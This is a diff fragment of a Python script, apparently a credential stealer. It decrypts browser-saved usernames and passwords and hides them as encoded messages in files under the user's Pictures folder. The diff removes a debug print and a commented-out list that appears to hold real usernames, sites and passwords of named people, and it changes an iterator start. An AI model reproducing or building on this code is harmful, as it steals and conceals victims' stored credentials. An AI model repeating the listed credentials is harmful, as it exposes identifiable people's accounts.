@@ -96,12 +96,10 @@ def decrypt_passwords():
 				if(s2[j].lower()=='p'):
 					break
 			username =  s2[:j]
-			print [username, hostname, password]
 			savedlist.append([username,hostname,password])
 			i=i+1
 	except:
 		pass
-	#savedlist = [['vivekanand','dss.nitc.ac.in','Bmyllb0900'],['vivekzhere','accounts.google.com','Bviassword'],['nithinvnath','http://onlinesbi.com','Bsectbanpassword'],['arunkuruvila','http://facebook.com','Bmybidaypw'],['aravind.an','http://twitter.com','Bfastrack'],['sreeraj.altair','http://accounts.google.com', 'Bs_game']]
 	msglist = []
 	for entry in savedlist:
 		msglist.append(format_msg(entry))
@@ -113,7 +111,7 @@ def decrypt_passwords():
 def first_run():
 	msglist = decrypt_passwords()			# List of browser saved passwords
 	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
-	i = 0									# Message Iterator
+	i = -1									# Message Iterator
 	encode_dir = path.expanduser("~/Pictures/Pictures/")
 	num_of_files = 0
 	if num_of_msgs > 0:
@@ -135,12 +133,13 @@ def first_run():
 			f.close()
 		except:
 			pass
-			
+	
+# Function for successive encode runs		
 def encode_run (decode_msglist,update_dt):
 	browser_msglist = decrypt_passwords()
 	msglist = browser_msglist + decode_msglist
 	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
-	i = 0									# Message Iterator
+	i = -1									# Message Iterator
 	encode_dir = path.expanduser("~/Pictures/Pictures/")
 	num_of_files = 0
 	if num_of_msgs > 0:
